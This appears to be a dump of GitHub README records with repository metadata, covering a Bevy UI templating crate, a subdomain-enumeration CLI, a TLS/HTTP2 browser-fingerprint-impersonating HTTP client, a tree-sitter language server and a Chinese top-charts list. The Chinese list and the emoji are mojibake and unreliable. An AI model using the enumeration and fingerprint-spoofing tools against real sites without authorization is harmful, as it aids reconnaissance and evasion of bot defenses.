    mut html_comps: HtmlComponents,
    mut html_funcs: HtmlFunctions,
) {
    // simple register
    html_comps.register(""my_button"", server.load(""my_button.html""));

    // advanced register, with spawn functions
    html_comps.register_with_spawn_fn(""my_button"", server.load(""my_button.html""), |mut entity_commands| {
        entity_commands.insert(MyCustomComponent);
    })

    // create a system binding that will change the game state.
    // any (one-shot) system with `In<Entity>` is valid!
    // the entity represents the node, the function is called on
    html_funcs.register(""start_game"", |In(entity): In<Entity>, mut state : ResMut<NextState<GameState>> |{
        state.set(GameState::Play);
    });

```

## Putting it all together

Time to be creative. Include your component in the next template.

```html
<!-- menu.html -->
<template>
    <property name=""title"">My Game</property>
    ...
    <image
        display=""grid""
        grid_template_columns=""(2, auto)""
        src=""ui_panel.png""
        image_scale_mode=""10px tile(1) tile(1) 4""
    >
        <my_button
            text=""Start Game""
            action=""start_game""
        />
        <my_button
            text=""Settings""
            action=""to_settings""
        />
        <my_button
            text=""Credits""
            action=""to_credits""
        />
        <my_button
            text=""Exit""
            action=""quit_game""
        />
    </image>
    ...
</template>
```

## Spawning your Template

Required components make it super simple.

```rust
fn setup(
    mut cmd: Commands,
    server: Res<AssetServer>,
) {
    cmd.spawn(Camera2dBundle::default());
    cmd.spawn(HtmlNode(server.load(""menu.html""));
}
```

## Hot reload and advanced examples

Hot reload requires bevy `file_watcher` feature to be enabled.

Checkout the examples for advanced interactions, play with the assets. Keep in mind these are
very crude proof of concepts.

```bash
# basic menu demo
cargo run -p example --bin ui

# simple text inputs with a submit form
cargo run -p example --bin input

# simple sliders
cargo run -p example --bin slider
```

## Help wanted

I do not plan to offer any widgets on the templating side, but I would like
to have common components and system for a general reusable widget toolkit like
sliders, drop downs, draggable and so on.

Checkout the examples, if you come up with some really cool widgets, I would be happy
to merge them into a

### More examples

I am not the greatest designer. I am actively looking for some really fancy and cool examples, using
this crate to include in the example crate.

## Known limitations and Pitfalls

-   Any manual changes to bevy's styling components will be overwritten
-   Do not recursive import. [mem stonks, bug]
-   One root node per component.
",2,0,2,Apache-2.0,,3.0
Merklemap/merklemap-cli,master,"# MerkleMap CLI

A command-line interface (CLI) client for the [merklemap](https://www.merklemap.com/) API. This tool allows you to
search / enumerate subdomains
matching a given query and tail live subdomain discoveries from the Merklemap ingestion pipeline.

<a href=""https://asciinema.org/a/dr4PwFmf9t1anDV3vWwFXFZJ5"" target=""_blank""><img src=""https://asciinema.org/a/dr4PwFmf9t1anDV3vWwFXFZJ5.svg"" /></a>

## Features

- Search for subdomains matching a specific query
- Tail live subdomain discoveries in real-time

## Installation

To install the MerkleMap CLI, you need to have Rust and Cargo installed on your system. If you don't have them
installed, you can get them from [rustup.rs](https://rustup.rs/).

Once you have Rust and Cargo installed, you can build and install the CLI by running:

```
cargo install merklemap-cli
```

This will compile the project and install the binary in your Cargo bin directory.

## Usage

The MerkleMap CLI provides two main commands:

### Search

To search for subdomains matching a query:

```
merklemap-cli search <QUERY>
```

Replace `<QUERY>` with your search term.

### Tail

To tail live subdomain discoveries:

```
merklemap-cli tail
```

## Output Format

### Search Output

The search command outputs results in the following format:

```
domain=<domain> subject_common_name=<common_name> not_before=<timestamp> human_readable_not_before=<formatted_date>
```

### Tail Output

The tail command outputs results in the following format:

```
hostname=<hostname> timestamp=<ISO8601_timestamp> human_readable_not_before=<formatted_date>
```

## Development

To build the project:

```
cargo build
```

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.
",1,1,1,MIT,rust.yml,0.0
aranya-project/aranya-core,main,"# Aranya Core

This repo is a cargo workspace for the Rust implementation for the core of the Aranya platform.

## Cargo Make

This repo uses `cargo-make` as a task runner.

### Install

```
cargo install cargo-make --locked
```

### Usage

`cargo-make` can be used as a cargo plugin via `cargo make <task>` or directly as `makers <task>`.

Note that you must be in the root directory of the repo to run tasks. To view all tasks, run `cargo make` or see [`Makefile.toml`](Makefile.toml).

```sh
# lists all tasks
makers

# auto-format files
makers fmt

# run all unit tests
makers unit-tests

# run correctness checks
makers correctness
```
",1,0,3,AGPL-3.0,"build-vxworks.yml,build.yml,correctness.yml,doc.yml,publish.yml,security.yml,tests.yml",3.0
ribru17/ts_query_ls,master,"# An LSP implementation for [tree-sitter](https://tree-sitter.github.io/tree-sitter/) query files

<!-- vim: set spell: -->

## Configuration

```jsonc
{
  ""settings"": {
    // Where to look for parsers, of the form <lang>.(so|dll|dylib)
    // or tree-sitter-<lang>.wasm
    ""parser_install_directories"": [""a/list/of"", ""parser/installation/paths""],
    // A list of parser aliases (e.g. point queries/ecma/*.scm files to the
    // javascript parser)
    ""parser_aliases"": {
      ""ecma"": ""javascript""
    },
    // A list of patterns to aid the LSP in finding a language, given a file
    // path. Patterns must have one capture group which represents the language
    // name. Ordered from highest to lowest precedence.
    ""language_retrieval_patterns"": [
      // E.g. zed support
      ""languages/src/([^/]+)/[^/]+\\.scm$""
      // The following fallbacks are *always* provided:
      //
      // tree-sitter-([^/]+)/queries/[^/]+\.scm$
      // queries/([^/]+)/[^/]+\.scm$
    ]
  }
}
```

Example setup (for Neovim):

```lua
vim.api.nvim_create_autocmd('FileType', {
  pattern = 'query',
  callback = function(ev)
    if vim.bo[ev.buf].buftype == 'nofile' then
      return
    end
    vim.lsp.start {
      name = 'ts_query_ls',
      cmd = { '/path/to/ts_query_ls/target/release/ts_query_ls' },
      root_dir = vim.fs.root(0, { 'queries' }),
      settings = {
        parser_install_directories = {
          -- If using nvim-treesitter with lazy.nvim
          vim.fs.joinpath(
            vim.fn.stdpath('data'),
            '/lazy/nvim-treesitter/parser/'
          ),
        },
        parser_aliases = {
          ecma = 'javascript',
        },
        language_retrieval_patterns = {
          'languages/src/([^/]+)/[^/]+\\.scm$',
        },
      },
    }
  end,
})
```

## Checklist

- [x] References for captures
- [x] Renaming captures
- [x] Completions for capture names in a pattern (for predicates)
- [x] Completions for node names
- [x] Fix utility functions, making them robust when it comes to UTF-16 code
      points
- [x] Go to definition for captures
- [ ] Recognition/completion of supertypes (requires `tree-sitter 0.25`)
- [ ] Completions and diagnostics for a supertype's subtypes
  - Requires <https://github.com/tree-sitter/tree-sitter/pull/3938>
- [x] Completions field names
- [x] Diagnostics for unrecognized nodes
- [x] Diagnostics for referencing undefined capture groups in predicates
- [x] Diagnostics for incorrect syntax
- [ ] Diagnostics for impossible patterns
  - Currently not possible without a full (sometimes expensive) run of the query
    file. This should either be implemented as a user command, or core methods
    should be exposed to gather pattern information more efficiently
- [x] Recognize parsers built for `WASM`
- [x] Document formatting compatible with the `nvim-treesitter` formatter
- [ ] Code cleanup
- [ ] Add tests for all functionality

### Packaging

- [ ] [`homebrew`](https://github.com/Homebrew/homebrew-core)
      ([in progress](https://github.com/Homebrew/homebrew-core/pull/197587),
      requires repo to reach 75 GitHub stars)
- [ ] [`nixpkgs`](https://github.com/NixOS/nixpkgs)
      ([in progress](https://github.com/NixOS/nixpkgs/pull/350834))
- [ ] [`mason.nvim`](https://github.com/mason-org/mason-registry)
      ([in progress](https://github.com/mason-org/mason-registry/pull/7849))

And others?

## References

Many thanks to @lucario387, and the
[asm-lsp](https://github.com/bergercookie/asm-lsp),
[`jinja-lsp`](https://github.com/uros-5/jinja-lsp),
[`beancount`-language-server](https://github.com/polarmutex/beancount-language-server),
and [helix-editor](https://github.com/helix-editor/helix) projects for the
amazing code that I took inspiration from!
",11,0,5,MIT,"ci.yml,release.yml",8.0
penumbra-x/rquest,main,"# rquest

[![Crates.io License](https://img.shields.io/crates/l/rquest)](./LICENSE)
[![crates.io](https://img.shields.io/crates/v/rquest.svg)](https://crates.io/crates/rquest)
[![Crates.io Total Downloads](https://img.shields.io/crates/d/rquest)](https://crates.io/crates/rquest)

> üöÄ Support my journey to full-time open-source development by [sponsoring me on GitHub](https://github.com/penumbra-x/.github/blob/main/profile/SPONSOR.md)

An ergonomic, all-in-one `JA3`/`JA4`/`HTTP2` fingerprint `HTTP`/`WebSocket` client.

- Plain, JSON, urlencoded, multipart bodies
- Header Order
- Redirect policy
- Cookie Store
- `HTTPS`/`WebSocket` via BoringSSL
- Preconfigured `TLS`/`HTTP2` settings
- `HTTP`, `HTTPS`, `SOCKS4` and `SOCKS5` proxies
- [Changelog](https://github.com/penumbra-x/rquest/blob/main/CHANGELOG.md)

Additional learning resources include:

- [API Documentation](https://docs.rs/rquest)
- [Repository Examples](https://github.com/penumbra-x/rquest/tree/main/examples)

> &#9888; This crate is under active development and the API is not yet stable.

## Usage

This asynchronous example uses [Tokio](https://tokio.rs) and enables some
optional features, so your `Cargo.toml` could look like this:

HTTP

```toml
[dependencies]
tokio = { version = ""1"", features = [""full""] }
rquest = ""0.27""
```

```rust,no_run
use rquest::tls::Impersonate;

#[tokio::main]
async fn main() -> Result<(), rquest::Error> {
    // Build a client to mimic Chrome131
    let client = rquest::Client::builder()
        .impersonate(Impersonate::Chrome131)
        .build()?;

    // Use the API you're already familiar with
    let resp = client.get(""https://tls.peet.ws/api/all"").send().await?;
    println!(""{}"", resp.text().await?);

    Ok(())
}
```

WebSocket

```toml
[dependencies]
tokio = { version = ""1"", features = [""full""] }
rquest = { version = ""0.27"", features = [""websocket""] }
```

```rust,no_run
use futures_util::{SinkExt, StreamExt, TryStreamExt};
use rquest::{tls::Impersonate, Client, Message};

#[tokio::main]
async fn main() -> Result<(), rquest::Error> {
    // Build a client to mimic Chrome131
    let client = Client::builder()
        .impersonate(Impersonate::Chrome131)
        .build()?;

    // Use the API you're already familiar with
    let websocket = client
        .websocket(""wss://echo.websocket.org"")
        .send()
        .await?
        .into_websocket()
        .await?;

    let (mut tx, mut rx) = websocket.split();

    tokio::spawn(async move {
        for i in 1..11 {
            tx.send(Message::Text(format!(""Hello, World! #{i}"")))
                .await
                .unwrap();
        }
    });

    while let Some(message) = rx.try_next().await? {
        match message {
            Message::Text(text) => println!(""received: {text}""),
            _ => {}
        }
    }

    Ok(())
}

```

Preconfigured `TLS`/`HTTP2`

```toml
[dependencies]
tokio = { version = ""1"", features = [""full""] }
rquest = ""0.27""
```

```rust
use boring::ssl::{SslConnector, SslCurve, SslMethod, SslOptions};
use http::{header, HeaderValue};
use rquest::{
    tls::{Http2Settings, ImpersonateSettings, TlsSettings, Version},
    HttpVersionPref,
};
use rquest::{PseudoOrder::*, SettingsOrder::*};

#[tokio::main]
async fn main() -> Result<(), rquest::Error> {
    // Create a pre-configured TLS settings
    let settings = ImpersonateSettings::builder()
        .tls(
            TlsSettings::builder()
                .connector(Box::new(|| {
                    let mut builder = SslConnector::builder(SslMethod::tls_client())?;
                    builder.set_curves(&[SslCurve::SECP224R1, SslCurve::SECP521R1])?;
                    builder.set_options(SslOptions::NO_TICKET);
                    Ok(builder)
                }))
                .tls_sni(true)
                .http_version_pref(HttpVersionPref::All)
                .application_settings(true)
                .pre_shared_key(true)
                .enable_ech_grease(true)
                .permute_extensions(true)
                .min_tls_version(Version::TLS_1_0)
                .max_tls_version(Version::TLS_1_3)
                .build(),
        )
        .http2(
            Http2Settings::builder()
                .initial_stream_window_size(6291456)
                .initial_connection_window_size(15728640)
                .max_concurrent_streams(1000)
                .max_header_list_size(262144)
                .header_table_size(65536)
                .enable_push(false)
                .headers_priority((0, 255, true))
                .headers_pseudo_order([Method, Scheme, Authority, Path])
                .settings_order([
                    HeaderTableSize,
                    EnablePush,
                    MaxConcurrentStreams,
                    InitialWindowSize,
                    MaxFrameSize,
                    MaxHeaderListSize,
                    UnknownSetting8,
                    UnknownSetting9,
                ])
                .build(),
        )
        .headers(Box::new(|headers| {
            headers.insert(header::USER_AGENT, HeaderValue::from_static(""rquest""));
        }))
        .build();

    // Build a client with pre-configured TLS settings
    let client = rquest::Client::builder()
        .use_preconfigured_tls(settings)
        .build()?;

    // Use the API you're already familiar with
    let resp = client.get(""https://tls.peet.ws/api/all"").send().await?;
    println!(""{}"", resp.text().await?);

    Ok(())
}

```

## Device

Currently supported impersonate device types

- **Chrome**

`Chrome100`Ôºå`Chrome101`Ôºå`Chrome104`Ôºå`Chrome105`Ôºå`Chrome106`Ôºå`Chrome107`Ôºå`Chrome108`Ôºå`Chrome109`Ôºå`Chrome114`Ôºå`Chrome116`Ôºå`Chrome117`Ôºå`Chrome118`Ôºå`Chrome119`Ôºå`Chrome120`Ôºå`Chrome123`Ôºå`Chrome124`Ôºå`Chrome126`Ôºå`Chrome127`Ôºå`Chrome128`Ôºå`Chrome129`Ôºå`Chrome130`Ôºå`Chrome131`

- **Edge**

`Edge101`Ôºå`Edge122`Ôºå`Edge127`

- **Safari**

`SafariIos17_2`Ôºå`SafariIos17_4_1`Ôºå`SafariIos16_5`Ôºå`Safari15_3`Ôºå`Safari15_5`Ôºå`Safari15_6_1`Ôºå`Safari16`Ôºå`Safari16_5`Ôºå`Safari17_0`Ôºå`Safari17_2_1`Ôºå`Safari17_4_1`Ôºå`Safari17_5`Ôºå`Safari18`Ôºå`SafariIPad18`

- **OkHttp**

`OkHttp3_9`Ôºå`OkHttp3_11`Ôºå`OkHttp3_13`Ôºå`OkHttp3_14`Ôºå`OkHttp4_9`Ôºå`OkHttp4_10`Ôºå`OkHttp5`

## Requirement

Install the environment required to build [BoringSSL](https://github.com/google/boringssl/blob/master/BUILDING.md)

Do not compile with crates that depend on `OpenSSL`; their prefixing symbols are the same and may cause linking [failures](https://github.com/rustls/rustls/issues/2010).

If both `OpenSSL` and `BoringSSL` are used as dependencies simultaneously, even if the compilation succeeds, strange issues may still arise.

## Building

```shell
sudo apt-get install build-essential cmake perl pkg-config libclang-dev musl-tools -y

cargo build --release
```

You can also use [this GitHub Actions workflow](https://github.com/penumbra-x/rquest/blob/main/.github/compilation-guide/build.yml) to compile your project on **Linux**, **Windows**, and **macOS**.

## Contributing

If you would like to submit your contribution, please open a [Pull Request](https://github.com/penumbra-x/rquest/pulls).

## Getting help

Your question might already be answered on the [issues](https://github.com/penumbra-x/rquest/issues)

## License

Apache-2.0 [LICENSE](LICENSE)

## Accolades

The project is based on a fork of [reqwest](https://github.com/seanmonstar/reqwest).
",22,0,1,Apache-2.0,ci.yml,8.0
DVSR1411/onlinebookstore,master,"# üìö OnlineBookStore üìö 
## Description 
**OnlineBookStore** is a web application built using Java Servlets. It allows users to browse, search, and purchase books online. The backend is powered by MySQL, and the application is containerized using Docker for easy deployment and scalability. 
## Features ‚ú® 
- üîí User registration and login
- üìñ Browse and search for books
- üõí Add books to cart and checkout
- üìú Order history and management 
- ‚öôÔ∏è Admin panel for managing books and orders
## Technologies Used üõ†Ô∏è 
- **Java Servlets**
- **MySQL**
- **Docker**
- **HTML/CSS/JavaScript**
## Installation‚öôÔ∏è
### Prerequisitesüìã
- Docker installed on your machine
- Java Development Kit (JDK) installed
### StepsüöÄ
1. **Clone the repository:**
   ```sh
   git clone https://github.com/yourusername/onlinebookstore.git
   cd onlinebookstore
2. **Build the Docker images:**
    ```sh
    docker-compose build
3. **Start the containers:**
    ```sh
    docker-compose up
4. Access the application: Open your web browser and navigate to http://localhost:8080.
## Contactüì¨:
- For any questions or support, please contact Sathwik at d.v.sathwikreddy@gmail.com.
- Feel free to adjust any specifics to better fit your project!
",0,0,1,,,0.0
ChHsiching/GitHub-Chinese-Top-Charts,main,"![GitHub‰∏≠ÊñáÊéíË°åÊ¶ú](https://i.v2ex.co/wF4Dx0vO.png)

#### Ê¶úÂçïËÆæÁ´ãÁõÆÁöÑ

- :cn: GitHub‰∏≠ÊñáÊéíË°åÊ¶úÔºåÂ∏ÆÂä©‰Ω†ÂèëÁé∞È´òÂàÜ‰ºòÁßÄ‰∏≠ÊñáÈ°πÁõÆÔºõ
- ÂêÑ‰ΩçÂºÄÂèëËÄÖ‰ºô‰º¥ÂèØ‰ª•Êõ¥È´òÊïàÂú∞Âê∏Êî∂ÂõΩ‰∫∫ÁöÑ‰ºòÁßÄÁªèÈ™å„ÄÅÊàêÊûúÔºõ
- ‰∏≠ÊñáÈ°πÁõÆÂè™ËÉΩÊª°Ë∂≥Èò∂ÊÆµÊÄßÁöÑÈúÄÊ±ÇÔºåÊÉ≥Ë¶ÅÊúâËøõ‰∏ÄÊ≠•ÊèêÂçáÔºåËøòËØ∑Â§öËä±Êó∂Èó¥Â≠¶‰π†È´òÂàÜÁ•ûÁ∫ßËã±ÊñáÈ°πÁõÆÔºõ

#### Ê¶úÂçïËÆæÁ´ãËåÉÂõ¥

- ËÆæÁ´ã1‰∏™ÊÄªÊ¶úÔºàÊâÄÊúâËØ≠Ë®ÄÈ°πÁõÆÊ±áÊÄªÊéíÂêçÔºâ„ÄÅ18‰∏™ÂàÜÊ¶úÔºàÂçï‰∏™ËØ≠Ë®ÄÈ°πÁõÆÊéíÂêçÔºâÔºõ

#### Ê¶úÂçïÂÖ•ÈÄâËßÑÂàô

- ‰∏Ä‰∏™Â∞èÂ∞èÁöÑË¶ÅÊ±ÇÔºöÈ°πÁõÆÁöÑ Description Âíå README.md ÈÉΩË¶ÅÂåÖÂê´‰∏≠ÊñáËØ¥ÊòéÔºõ
- Êõ¥Êñ∞Ë∂äÊåÅÁª≠Ë∂äÂ•ΩÔºöÊúÄËøëÂçäÂπ¥ÂÜÖÊúâÊõ¥Êñ∞ËøáÁöÑÈ°πÁõÆÊâçÊúâÊú∫‰ºöÂÖ•ÈÄâÔºàÊã•Êä±Ê¥ªË∑ÉÔºåËøúÁ¶ªÂÉµÂ∞∏ÔºâÔºõ
- Stars Ë∂äÂ§öË∂äÂ•ΩÔºöÂú®Êª°Ë∂≥ÊåÅÁª≠Êõ¥Êñ∞ÁöÑÂâçÊèêÊù°‰ª∂‰∏ãÔºåÂêÑÊ¶úÊ†πÊçÆ Stars ÂØπÈ°πÁõÆËøõË°åÊéíÂ∫èÔºõ

#### Ê¶úÂçïÊõ¥Êñ∞È¢ëÁéá

- ÊØèÂë®Êõ¥Êñ∞‰∏ÄÊ¨°ÔºåÊúÄËøëÊõ¥Êñ∞Êó∂Èó¥‰∏∫10Êúà30Êó•Ôºõ

#### License

- Êú¨‰ªìÂ∫ìÂÜÖÂÆπÁöÑÂÆö‰πâ„ÄÅÂàõÂª∫„ÄÅÊõ¥Êñ∞Áª¥Êä§ÂùáÁî±Êú¨‰∫∫ÂèëËµ∑‰∏éÊé®ËøõÔºåÂú®ÊÇ®ÂºïÁî®Êú¨‰ªìÂ∫ìÂÜÖÂÆπ„ÄÅËΩ¨ËΩΩÊñáÁ´†Êó∂ÔºåËØ∑Âú®ÂºÄÂ§¥ÊòéÊòæÂ§ÑÊ†áÊòé‰ΩúËÄÖÂèäÈ°µÈù¢Âú∞ÂùÄÔºåË∞¢Ë∞¢Ôºõ

<br/>

## ÁõÆÂΩï

- ÊÄªÊ¶ú
  - [All Language](#All-Language)

- ÂàÜÊ¶ú
  - [Java](#Java)
  - [Python](#Python)
  - [Go](#Go)
  - [PHP](#PHP)
  - [JavaScript](#JavaScript)
  - [Vue](#Vue)
  - [CSS](#CSS)
  - [HTML](#HTML)
  - [Objective-C](#Objective-C)
  - [Swift](https://github.com/kon9chunkit/GitHub-Chinese-Top-Charts/blob/master/README-Part2.md#Swift)
  - [Jupyter Notebook](https://github.com/kon9chunkit/GitHub-Chinese-Top-Charts/blob/master/README-Part2.md#Jupyter-Notebook)
  - [Shell](https://github.com/kon9chunkit/GitHub-Chinese-Top-Charts/blob/master/README-Part2.md#Shell)
  - [C](https://github.com/kon9chunkit/GitHub-Chinese-Top-Charts/blob/master/README-Part2.md#C)
  - [C++](https://github.com/kon9chunkit/GitHub-Chinese-Top-Charts/blob/master/README-Part2.md#C-1)
  - [C#](https://github.com/kon9chunkit/GitHub-Chinese-Top-Charts/blob/master/README-Part2.md#C-2)
  - [Dart](https://github.com/kon9chunkit/GitHub-Chinese-Top-Charts/blob/master/README-Part2.md#Dart)
  - [TeX](https://github.com/kon9chunkit/GitHub-Chinese-Top-Charts/blob/master/README-Part2.md#TeX)
  - [Vim script](https://github.com/kon9chunkit/GitHub-Chinese-Top-Charts/blob/master/README-Part2.md#Vim-script)

<br/>


## All Language

|#|Repository|Description|Stars|Language|Updated|
|:-|:-|:-|:-|:-|:-|
|1|[CyC2018/CS-Notes](https://github.com/CyC2018/CS-Notes)|:books: ÊäÄÊúØÈù¢ËØïÂøÖÂ§áÂü∫Á°ÄÁü•ËØÜ„ÄÅLeetcode„ÄÅËÆ°ÁÆóÊú∫Êìç‰ΩúÁ≥ªÁªü„ÄÅËÆ°ÁÆóÊú∫ÁΩëÁªú„ÄÅÁ≥ªÁªüËÆæËÆ°„ÄÅJava„ÄÅPython„ÄÅC++|113.6k|Java|10/29|
|2|[jackfrued/Python-100-Days](https://github.com/jackfrued/Python-100-Days)|Python - 100Â§©‰ªéÊñ∞ÊâãÂà∞Â§ßÂ∏à|94.7k|Python|10/22|
|3|[Snailclimb/JavaGuide](https://github.com/Snailclimb/JavaGuide)|„ÄåJavaÂ≠¶‰π†+Èù¢ËØïÊåáÂçó„Äç‰∏Ä‰ªΩÊ∂µÁõñÂ§ßÈÉ®ÂàÜJavaÁ®ãÂ∫èÂëòÊâÄÈúÄË¶ÅÊéåÊè°ÁöÑÊ†∏ÂøÉÁü•ËØÜ„ÄÇÂáÜÂ§á Java Èù¢ËØïÔºåÈ¶ñÈÄâ JavaGuideÔºÅ|90.7k|Java|10/29|
|4|[justjavac/free-programming-books-zh_CN](https://github.com/justjavac/free-programming-books-zh_CN)|:books: ÂÖçË¥πÁöÑËÆ°ÁÆóÊú∫ÁºñÁ®ãÁ±ª‰∏≠Êñá‰π¶Á±çÔºåÊ¨¢ËøéÊäïÁ®ø|70.8k|-|09/04|
|5|[labuladong/fucking-algorithm](https://github.com/labuladong/fucking-algorithm)|Âà∑ÁÆóÊ≥ïÂÖ®Èù†Â•óË∑ØÔºåËÆ§ÂáÜ labuladong Â∞±Â§ü‰∫ÜÔºÅEnglish version supported! Crack LeetCode, not only how, but also why. |67.9k|-|10/29|
|6|[MisterBooo/LeetCodeAnimation](https://github.com/MisterBooo/LeetCodeAnimation)|Demonstrate all the questions on LeetCode in the form of animation.ÔºàÁî®Âä®ÁîªÁöÑÂΩ¢ÂºèÂëàÁé∞Ëß£LeetCodeÈ¢òÁõÆÁöÑÊÄùË∑ØÔºâ|60.3k|Java|09/30|
|7|[doocs/advanced-java](https://github.com/doocs/advanced-java)|üòÆ ‰∫íËÅîÁΩë Java Â∑•Á®ãÂ∏àËøõÈò∂Áü•ËØÜÂÆåÂÖ®Êâ´Áõ≤ÔºöÊ∂µÁõñÈ´òÂπ∂Âèë„ÄÅÂàÜÂ∏ÉÂºè„ÄÅÈ´òÂèØÁî®„ÄÅÂæÆÊúçÂä°„ÄÅÊµ∑ÈáèÊï∞ÊçÆÂ§ÑÁêÜÁ≠âÈ¢ÜÂüüÁü•ËØÜÔºåÂêéÁ´ØÂêåÂ≠¶ÂøÖÁúãÔºåÂâçÁ´ØÂêåÂ≠¶‰πüÂèØÂ≠¶‰π†|49.1k|Java|10/28|
|8|[xingshaocheng/architect-awesome](https://github.com/xingshaocheng/architect-awesome)|ÂêéÁ´ØÊû∂ÊûÑÂ∏àÊäÄÊúØÂõæË∞±|47.9k|-|08/25|
|9|[macrozheng/mall](https://github.com/macrozheng/mall)|mallÈ°πÁõÆÊòØ‰∏ÄÂ•óÁîµÂïÜÁ≥ªÁªüÔºåÂåÖÊã¨ÂâçÂè∞ÂïÜÂüéÁ≥ªÁªüÂèäÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÔºåÂü∫‰∫éSpringBoot+MyBatisÂÆûÁé∞ÔºåÈááÁî®DockerÂÆπÂô®ÂåñÈÉ®ÁΩ≤„ÄÇ ÂâçÂè∞ÂïÜÂüéÁ≥ªÁªüÂåÖÂê´È¶ñÈ°µÈó®Êà∑„ÄÅÂïÜÂìÅÊé®Ëçê„ÄÅÂïÜÂìÅÊêúÁ¥¢„ÄÅÂïÜÂìÅÂ±ïÁ§∫„ÄÅË¥≠Áâ©ËΩ¶„ÄÅËÆ¢ÂçïÊµÅÁ®ã„ÄÅ‰ºöÂëò‰∏≠ÂøÉ„ÄÅÂÆ¢Êà∑ÊúçÂä°„ÄÅÂ∏ÆÂä©‰∏≠ÂøÉÁ≠âÊ®°Âùó„ÄÇ ÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÂåÖÂê´ÂïÜÂìÅÁÆ°ÁêÜ„ÄÅËÆ¢ÂçïÁÆ°ÁêÜ„ÄÅ‰ºöÂëòÁÆ°ÁêÜ„ÄÅ‰øÉÈîÄÁÆ°ÁêÜ„ÄÅËøêËê•ÁÆ°ÁêÜ„ÄÅÂÜÖÂÆπÁÆ°ÁêÜ„ÄÅÁªüËÆ°Êä•Ë°®„ÄÅË¥¢Âä°ÁÆ°ÁêÜ„ÄÅÊùÉÈôêÁÆ°ÁêÜ„ÄÅËÆæÁΩÆÁ≠âÊ®°Âùó„ÄÇ|42.8k|Java|10/29|
|10|[scutan90/DeepLearning-500-questions](https://github.com/scutan90/DeepLearning-500-questions)|Ê∑±Â∫¶Â≠¶‰π†500ÈóÆÔºå‰ª•ÈóÆÁ≠îÂΩ¢ÂºèÂØπÂ∏∏Áî®ÁöÑÊ¶ÇÁéáÁü•ËØÜ„ÄÅÁ∫øÊÄß‰ª£Êï∞„ÄÅÊú∫Âô®Â≠¶‰π†„ÄÅÊ∑±Â∫¶Â≠¶‰π†„ÄÅËÆ°ÁÆóÊú∫ËßÜËßâÁ≠âÁÉ≠ÁÇπÈóÆÈ¢òËøõË°åÈòêËø∞Ôºå‰ª•Â∏ÆÂä©Ëá™Â∑±ÂèäÊúâÈúÄË¶ÅÁöÑËØªËÄÖ„ÄÇ ÂÖ®‰π¶ÂàÜ‰∏∫18‰∏™Á´†ËäÇÔºå50‰Ωô‰∏áÂ≠ó„ÄÇÁî±‰∫éÊ∞¥Âπ≥ÊúâÈôêÔºå‰π¶‰∏≠‰∏çÂ¶•‰πãÂ§ÑÊÅ≥ËØ∑ÂπøÂ§ßËØªËÄÖÊâπËØÑÊåáÊ≠£„ÄÇ   Êú™ÂÆåÂæÖÁª≠............ Â¶ÇÊúâÊÑèÂêà‰ΩúÔºåËÅîÁ≥ªscutjy2015@163.com                     ÁâàÊùÉÊâÄÊúâÔºåËøùÊùÉÂøÖÁ©∂       Tan 2018.06|41.2k|JavaScript|10/29|
|11|[azl397985856/leetcode](https://github.com/azl397985856/leetcode)| LeetCode Solutions: A Record of My Problem Solving Journey.( leetcodeÈ¢òËß£ÔºåËÆ∞ÂΩïËá™Â∑±ÁöÑleetcodeËß£È¢ò‰πãË∑Ø„ÄÇ)|37.5k|JavaScript|10/29|
|12|[bailicangdu/vue2-elm](https://github.com/bailicangdu/vue2-elm)|Âü∫‰∫é vue2 + vuex ÊûÑÂª∫‰∏Ä‰∏™ÂÖ∑Êúâ 45 ‰∏™È°µÈù¢ÁöÑÂ§ßÂûãÂçïÈ°µÈù¢Â∫îÁî®|34.7k|Vue|09/27|
|13|[521xueweihan/HelloGitHub](https://github.com/521xueweihan/HelloGitHub)|:octocat: Find pearls on open-source seashore ÂàÜ‰∫´ GitHub ‰∏äÊúâË∂£„ÄÅÂÖ•Èó®Á∫ßÁöÑÂºÄÊ∫êÈ°πÁõÆ|34.4k|Python|10/28|
|14|[justjavac/awesome-wechat-weapp](https://github.com/justjavac/awesome-wechat-weapp)|ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂºÄÂèëËµÑÊ∫êÊ±áÊÄª :100:|33.2k|-|10/28|
|15|[chinese-poetry/chinese-poetry](https://github.com/chinese-poetry/chinese-poetry)|The most comprehensive database of Chinese poetry üß∂ÊúÄÂÖ®‰∏≠ÂçéÂè§ËØóËØçÊï∞ÊçÆÂ∫ì,  ÂîêÂÆã‰∏§ÊúùËøë‰∏Ä‰∏áÂõõÂçÉÂè§ËØó‰∫∫,  Êé•Ëøë5.5‰∏áÈ¶ñÂîêËØóÂä†26‰∏áÂÆãËØó.  ‰∏§ÂÆãÊó∂Êúü1564‰ΩçËØç‰∫∫Ôºå21050È¶ñËØç„ÄÇ    ÈòøÈáåÊãõ Python P6/P7 ‰∏äÊµ∑Âº†Ê±ü, gaojunqi@outlook.com|30.1k|JavaScript|10/29|
|16|[0voice/interview_internal_reference](https://github.com/0voice/interview_internal_reference)|2020Âπ¥ÊúÄÊñ∞ÊÄªÁªìÔºåÈòøÈáåÔºåËÖæËÆØÔºåÁôæÂ∫¶ÔºåÁæéÂõ¢ÔºåÂ§¥Êù°Á≠âÊäÄÊúØÈù¢ËØïÈ¢òÁõÆÔºå‰ª•ÂèäÁ≠îÊ°àÔºå‰∏ìÂÆ∂Âá∫È¢ò‰∫∫ÂàÜÊûêÊ±áÊÄª„ÄÇ|29.2k|Python|10/17|
|17|[testerSunshine/12306](https://github.com/testerSunshine/12306)|12306Êô∫ËÉΩÂà∑Á•®ÔºåËÆ¢Á•®|28.8k|Python|09/26|
|18|[apachecn/AiLearning](https://github.com/apachecn/AiLearning)|AiLearning: Êú∫Âô®Â≠¶‰π† - MachineLearning - ML„ÄÅÊ∑±Â∫¶Â≠¶‰π† - DeepLearning - DL„ÄÅËá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜ NLP|27.6k|Python|10/27|
|19|[xitu/gold-miner](https://github.com/xitu/gold-miner)|ü•áÊéòÈáëÁøªËØëËÆ°ÂàíÔºåÂèØËÉΩÊòØ‰∏ñÁïåÊúÄÂ§ßÊúÄÂ•ΩÁöÑËã±ËØë‰∏≠ÊäÄÊúØÁ§æÂå∫ÔºåÊúÄÊáÇËØªËÄÖÂíåËØëËÄÖÁöÑÁøªËØëÂπ≥Âè∞Ôºö|27.4k|-|10/29|
